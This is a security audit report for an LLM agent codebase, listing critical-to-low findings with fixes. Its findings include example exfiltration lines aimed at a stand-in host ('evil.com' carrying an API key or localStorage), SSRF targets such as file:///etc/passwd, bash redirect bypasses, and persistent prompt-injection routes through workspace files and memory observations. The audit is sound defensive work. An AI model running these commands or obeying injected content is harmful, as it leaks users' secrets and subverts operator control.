# Security Audit — 2026-04-09

## CRITICAL

### C1: API key exfiltration via `{{hub_api_key}}` templating
- **Files:** `src/tools/web.ts:29`, `src/tools/browser.ts:314-316`
- **Attack:** LLM sends URL `https://evil.com/?k={{hub_api_key}}` — key leaks in request. Same with browser `fill` action typing the key into attacker-controlled page.
- **Fix:** Remove `{{hub_api_key}}` templating entirely. Use header-based auth or inject programmatically in handler without exposing to LLM args.

### C2: Unrestricted `page.evaluate()` — arbitrary JS execution
- **File:** `src/tools/browser.ts:235-248`
- **Attack:** LLM injects `document.cookie`, `fetch('evil.com', {body: localStorage})`, keyloggers, etc. Only a 10KB length check exists, no content validation.
- **Fix:** Restrict `evaluate()` — expression allowlist or block dangerous APIs (`fetch`, `XMLHttpRequest`, `eval`, `Function`). Consider sandboxed evaluation context.

### C3: No URL allowlist for browser navigation (SSRF)
- **File:** `src/tools/browser.ts:175-186`
- **Attack:** LLM navigates to `http://127.0.0.1:8080/admin`, `file:///etc/passwd`, or attacker-controlled pages. Web tool has an allowlist; browser does not.
- **Fix:** Add URL allowlist to browser navigation. At minimum block `localhost`, `127.0.0.1`, internal IP ranges (`10.x`, `172.16-31.x`, `192.168.x`), and `file://` protocol.

### C4: Workspace files injected raw into system prompt
- **Files:** `src/agent/workspace.ts:135-156`, `src/agent/loop.ts:318`
- **Attack:** If attacker writes to `workspace/knowledge/_index.md` or `workspace/workflows/*.md`, payload goes straight into every agent's system prompt. Persistent prompt injection across sessions.
- **Fix:** Sanitize or validate workspace files before system prompt injection. Consider content hashing to detect tampering.

### C5: Deno fallback to unsandboxed Bun
- **File:** `src/tools/execute_code.ts:108-117`
- **Attack:** If Deno is absent, code runs via `bun run` with full filesystem/network access. No sandbox at all.
- **Fix:** Fail hard if Deno is unavailable. Remove the Bun fallback entirely.

---

## HIGH

### H1: Symlink-based sandbox escape
- **File:** `src/infra/sandbox.ts:31-64`
- **Attack:** Uses `path.resolve()` which normalizes `..` but doesn't follow symlinks. Attacker creates symlink in session dir pointing outside sandbox, then reads/writes through it.
- **Fix:** Use `fs.promises.realpath()` instead of `path.resolve()` for path validation.

### H2: Incomplete bash redirect parsing
- **File:** `src/tools/bash.ts:25-42`
- **Attack:** Redirect check misses `exec 3>/path`, process substitution `>(tee /path)`, here-docs with redirect, `$()` in targets.
- **Fix:** Blocklist dangerous bash patterns (`exec \d+>`, `coproc`, process substitution `>()`, command substitution in redirect targets).

### H3: Tool results flow into system prompt via memory observer
- **File:** `src/agent/memory/processor.ts`
- **Attack:** External content (web pages, API responses) → tool result → observer LLM → observations → concatenated into system prompt. Adversarial content can poison observations to override system prompt.
- **Fix:** Never inject external-origin content into system prompts. Use user-role messages for observations, or sanitize observer output.

### H4: No response body size limit on web downloads
- **Files:** `src/tools/web.ts:40-46`, `src/infra/fs.ts:25`
- **Attack:** LLM downloads a multi-GB response → memory exhaustion → DoS. Content-Length not checked before buffering.
- **Fix:** Check `Content-Length` header before download. Stream with a byte cap. Reject responses exceeding configured max (e.g. 50MB).

### H5: Server auth is optional and timing-vulnerable
- **File:** `src/server.ts:64-75`
- **Attack:** If `API_SECRET` env var is empty, `/chat` is completely unauthenticated. String comparison uses `!==` (timing attack).
- **Fix:** Require `API_SECRET` in production (fail startup if empty). Use `crypto.timingSafeEqual()`. Add rate limiting per IP.

### H6: OAuth tokens stored plaintext outside sandbox
- **File:** `src/infra/mcp-oauth.ts`
- **Attack:** Raw `writeFileSync` to `data/mcp-oauth/` — not in sandbox allowlist, not encrypted.
- **Fix:** Route through sandbox or add narrow `DATA_DIR/mcp-oauth` to write allowlist. Encrypt tokens at rest. Set file permissions to 600.

### H7: Error messages leak internal paths to LLM
- **File:** `src/tools/registry.ts:152`
- **Attack:** Raw `err.message` returned as tool result — often contains `/Users/jakubpruszynski/...` paths, stack traces, config details.
- **Fix:** Scrub file paths, stack traces, and system details from error messages before returning to LLM. Log full details internally.

### H8: No per-tool rate limiting
- **Scope:** All tools
- **Attack:** LLM calls expensive tools (web download, bash, browser) every iteration. 40-iteration cap exists but no per-tool throttle.
- **Fix:** Implement per-tool rate limits (e.g. max N calls per minute). Add session cost tracking.

---

## MEDIUM

### M1: ReDoS in grep
- **File:** `src/tools/grep.ts:21-26`
- **Attack:** Pathological regex `(a+)+b` causes exponential backtracking. Partially mitigated by 20-line-per-file cap.
- **Fix:** Add regex complexity analysis or use RE2/safe-regex library. Or add per-file timeout.

### M2: No CORS headers on server
- **File:** `src/server.ts`
- **Attack:** Only `X-Session-Id` exposed. No `Access-Control-Allow-Origin` set. Any origin can make cross-origin requests.
- **Fix:** Implement CORS middleware with explicit origin allowlist (not `*`).

### M3: Secrets injected into `process.env` at runtime
- **File:** `src/infra/tracing.ts:13-16`
- **Attack:** Langfuse keys written to `process.env` — visible to all child processes, crash dumps, debuggers.
- **Fix:** Load credentials lazily, never write to `process.env` after startup.

### M4: No cron frequency limit in scheduler
- **File:** `src/tools/scheduler.ts:23-31`
- **Attack:** `* * * * * *` (every second) accepted — resource exhaustion.
- **Fix:** Enforce minimum interval (e.g. 1 minute).

### M5: Browser screenshots may capture sensitive data
- **File:** `src/tools/browser.ts:344-382`
- **Attack:** Screenshots of authenticated pages saved unencrypted to session dir. No domain-based gating.
- **Fix:** Warn before screenshotting sensitive domains. Encrypt at rest.

### M6: Prompt template variables not escaped
- **File:** `src/llm/prompt.ts:19-24`
- **Attack:** If a variable value contains prompt injection payload, it's injected literally into the rendered prompt.
- **Fix:** Escape or validate variable values. Mark external-origin variables.

### M7: Deterministic Slack session IDs
- **File:** `src/slack.ts:6-14`
- **Attack:** `slack-{teamId}-{channelId}-{ts}` — predictable if Slack metadata is known. Could enable session hijacking.
- **Fix:** Add random UUID suffix to session IDs.

---

## LOW

### L1: `db/connection.ts` — sync `mkdirSync` outside sandbox
- Infra init, not user-controlled. Acceptable but inconsistent.

### L2: Event bus may stream internal tool params to SSE clients
- Depends on `allowedEvents` filter strictness. Review filter config.

### L3: `deepFreeze` doesn't prevent `Object.defineProperty` bypass
- Requires code execution. Theoretical only.

### L4: Web tool error reveals allowlist config
- `"Host X not on allowlist"` leaks allowlist details to LLM.

---

## What's Working Well

- **All production tools** use the sandbox singleton — zero violations in tool code
- **Path traversal via `../`** properly blocked (`resolve()` + prefix check)
- **File size limits** enforced (10MB)
- **Bash output** truncated (20KB), timeouts clamped [1s, 120s]
- **Code execution** filters env vars (no API keys leaked to subprocess)
- **Prototype pollution** blocked everywhere via `validateKeys()`
- **Glob/grep results** capped (500 files / 200 lines)
- **Fetch timeouts** consistent (30s with `AbortSignal`)
- **Session isolation** works — write narrowing to session dir is solid

---

## Recommended Fix Order

### Immediate (blocks production safety)
1. **C5** — Remove Bun fallback in execute_code
2. **C3** — Add URL allowlist to browser navigation
3. **C1** — Remove `{{hub_api_key}}` templating
4. **H1** — Use `fs.realpath()` in sandbox
5. **H2** — Blocklist dangerous bash patterns

### This week
6. **C2** — Restrict `page.evaluate()`
7. **C4** — Sanitize workspace files before system prompt injection
8. **H4** — Add Content-Length check on web downloads
9. **H5** — Require `API_SECRET`, use `timingSafeEqual`
10. **H7** — Scrub error messages before returning to LLM